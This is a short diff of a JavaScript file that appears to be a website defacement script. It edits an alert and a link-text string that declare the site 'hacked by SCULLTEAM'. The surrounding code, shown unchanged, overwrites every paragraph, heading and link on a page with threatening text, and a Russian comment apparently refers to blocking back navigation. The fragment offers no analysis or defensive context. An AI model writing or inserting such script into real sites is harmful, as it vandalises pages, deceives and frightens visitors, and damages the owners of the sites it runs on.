@@ -1,4 +1,4 @@
-alert('H4CK3D BY SULLTEAM');
+alert('𓂀H4CK3D BY SULLTEAM𓂀');
 
 // Отмена возврата (частично)
 
@@ -39,7 +39,7 @@ var paragraphsForReplace = document.getElementsByTagName("p");
 var h1ForReplace = document.getElementsByTagName("h1");
 var linksForReplace = document.getElementsByTagName("a");
 var replacementText = "HEY, TURN AROUND, TURN AROUND, TURN AROUND";
-var replacementLinkText = "THERE IS NO ESCAPE";
+var replacementLinkText = "𓂀𓄿𓆷𓊽𓏤𓏤𓋴𓇽SITE HACKED BY SCULLTEAM𓃀𓂋𓉔𓍯𓏁𓏉𓌆𓎡𓎡";
 
 for (var i = 0; i < paragraphsForReplace.length; i++) {
     paragraphsForReplace[i].textContent = replacementText;
